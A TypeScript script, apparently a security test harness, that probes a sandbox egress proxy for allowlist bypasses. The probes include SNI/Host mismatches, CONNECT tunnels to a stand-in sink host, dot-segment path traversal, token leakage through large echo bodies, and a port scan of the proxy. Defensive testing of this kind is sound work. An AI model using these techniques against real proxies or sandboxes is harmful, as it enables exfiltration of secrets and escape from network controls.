// Inside a Kurumi turn container (extra flag --dns <iron>): the attacks that differ for a MITM proxy.
// bun attack-iron.ts <iron-ip> <ca-file>. One JSON line per probe.
import { connect } from 'node:net'
import { readFileSync } from 'node:fs'
import { connect as tlsConnect } from 'node:tls'

const [iron = '10.251.11.50', caFile = '/work/.attack/iron-ca.crt'] = process.argv.slice(2)
const ca = readFileSync(caFile, 'utf8')
const tok = 'kurumi-fake-iron-static'
const CANARY = 'CANARY_REAL'
const out = (id: string, what: string, r: Record<string, unknown>) => console.log(JSON.stringify({ id, what, ...r }))

const viaFetch = async (url: string, init: RequestInit & { proxy?: string } = {}) => {
  try {
    const r = await fetch(url, { ...init, tls: { ca }, signal: AbortSignal.timeout(5000), headers: { authorization: `Bearer ${tok}`, ...(init.headers ?? {}) } } as RequestInit)
    const body = await r.text()
    return { status: r.status, body: body.slice(0, 200), canaryInResponse: body.includes(CANARY) }
  } catch (e) {
    return { error: String(e).slice(0, 200) }
  }
}

const tlsRaw = (host: string, port: number, sni: string, request: string, sock?: import('node:net').Socket) =>
  new Promise<string>((resolve) => {
    let got = ''
    const s = tlsConnect({ host, port, servername: sni, ca, ...(sock ? { socket: sock } : {}) }, () => s.write(request))
    s.setTimeout(4000, () => (s.destroy(), resolve(got || '(timeout)')))
    s.on('data', (d) => (got += d.toString()))
    s.on('end', () => resolve(got || '(closed)'))
    s.on('error', (e) => resolve(got || `error: ${e.message}`))
  })

const plainRaw = (host: string, port: number, request: string) =>
  new Promise<string>((resolve) => {
    let got = ''
    const s = connect(port, host, () => s.write(request))
    s.setTimeout(4000, () => (s.destroy(), resolve(got || '(timeout)')))
    s.on('data', (d) => (got += d.toString()))
    s.on('end', () => resolve(got || '(closed)'))
    s.on('error', (e) => resolve(`error: ${e.message}`))
  })

const connectThen = (target: string) =>
  new Promise<import('node:net').Socket | string>((resolve) => {
    const s = connect(8080, iron, () => s.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`))
    s.once('data', (d) => (d.toString().startsWith('HTTP/1.1 200') ? resolve(s) : (resolve(d.toString().split('\r\n')[0]!), s.destroy())))
    s.on('error', (e) => resolve(`error: ${e.message}`))
    s.setTimeout(4000, () => (s.destroy(), resolve('(timeout)')))
  })

const first = (s: string) => s.split('\r\n')[0]
const auth = `Authorization: Bearer ${tok}\r\n`

out('I0', 'DNS mode: allowed GET https://api.github.test/repos/a/b/issues', await viaFetch('https://api.github.test/repos/a/b/issues?probe=I0'))
out('I0b', 'tunnel mode (HTTPS_PROXY): same request', await viaFetch('https://api.github.test/repos/a/b/issues?probe=I0b', { proxy: `http://${iron}:8080` }))
out('I1', 'DNS mode: HTTPS to a host not on the allowlist (sink.test)', await viaFetch('https://sink.test/I1?probe=I1'))
out('I2', 'SNI api.github.test, Host sink.test (direct to :443)', { status: first(await tlsRaw(iron, 443, 'api.github.test', `GET /echo?probe=I2 HTTP/1.1\r\nHost: sink.test\r\n${auth}Connection: close\r\n\r\n`)) })
const c3 = await connectThen('sink.test:80')
out('I3', 'CONNECT sink.test:80 on the tunnel listener', { status: typeof c3 === 'string' ? c3 : 'tunnel opened' })
if (typeof c3 !== 'string') c3.destroy()
const c4 = await connectThen('api.github.test:443')
out('I4', 'CONNECT api.github.test:443, inner SNI api.github.test, inner Host sink.test', { status: typeof c4 === 'string' ? c4 : first(await tlsRaw(iron, 8080, 'api.github.test', `GET /echo?probe=I4 HTTP/1.1\r\nHost: sink.test\r\n${auth}Connection: close\r\n\r\n`, c4)) })
out('I5', 'absolute-form GET http://sink.test/I5 on the tunnel listener', { status: first(await plainRaw(iron, 8080, `GET http://sink.test/I5?probe=I5 HTTP/1.1\r\nHost: sink.test\r\nConnection: close\r\n\r\n`)) })
const c6 = await connectThen('10.251.10.80:80')
out('I6', 'CONNECT to the sink by IP literal', { status: typeof c6 === 'string' ? c6 : 'tunnel opened' })
if (typeof c6 !== 'string') c6.destroy()
out('I7', 'plain HTTP to :80 with Host sink.test', { status: first(await plainRaw(iron, 80, `GET /I7?probe=I7 HTTP/1.1\r\nHost: sink.test\r\nConnection: close\r\n\r\n`)) })
out('ID3', 'U8: POST /repos/a/b/issues on the allowed host (only GET + POST /echo allowed)', await viaFetch('https://api.github.test/repos/a/b/issues?probe=ID3', { method: 'POST', body: '{"title":"ID3"}' }))
out('ID6', 'dot-segment escape GET /repos/a/b/../../../user', { status: first(await tlsRaw(iron, 443, 'api.github.test', `GET /repos/a/b/../../../user?probe=ID6 HTTP/1.1\r\nHost: api.github.test\r\n${auth}Connection: close\r\n\r\n`)) })
out('ID7', 'encoded dot-segment GET /repos/a/b/%2e%2e/%2e%2e/%2e%2e/user', { status: first(await tlsRaw(iron, 443, 'api.github.test', `GET /repos/a/b/%2e%2e/%2e%2e/%2e%2e/user?probe=ID7 HTTP/1.1\r\nHost: api.github.test\r\n${auth}Connection: close\r\n\r\n`)) })
out('IL1', 'E2: echo on the allowed host reflects the swapped-in secret', await viaFetch('https://api.github.test/echo?probe=IL1'))
for (const [id, size] of [['E1a', 512 * 1024], ['E1b', 2 * 1024 * 1024]] as const) {
  const body = 'x'.repeat(size - 40) + `tail-marker-${id}-` + tok
  const r = await viaFetch(`https://api.github.test/echo?probe=${id}`, { method: 'POST', body })
  out(id, `E1: POST ${size} bytes (proxy token at the very end of the body) to the echo; secrets transform has match_body`, { sent: Buffer.byteLength(body), ...r })
}

// U7: what of iron-proxy the container can reach.
const ports: Record<number, string> = {}
for (const port of [22, 53, 80, 443, 8080, 9090, 9091, 9092, 15000]) {
  ports[port] = await new Promise<string>((resolve) => {
    const s = connect(port, iron, () => (s.destroy(), resolve('open')))
    s.setTimeout(1500, () => (s.destroy(), resolve('timeout')))
    s.on('error', (e) => resolve((e as NodeJS.ErrnoException).code ?? 'error'))
  })
}
out('IC1', `TCP scan of ${iron}`, { ports })
const metrics = await plainRaw(iron, 9090, `GET /metrics HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n`)
out('IC2', 'metrics :9090 /metrics', { status: first(metrics), bytes: metrics.length, canaryInResponse: metrics.includes(CANARY), sample: metrics.split('\n').filter((l) => l.startsWith('iron')).slice(0, 4) })
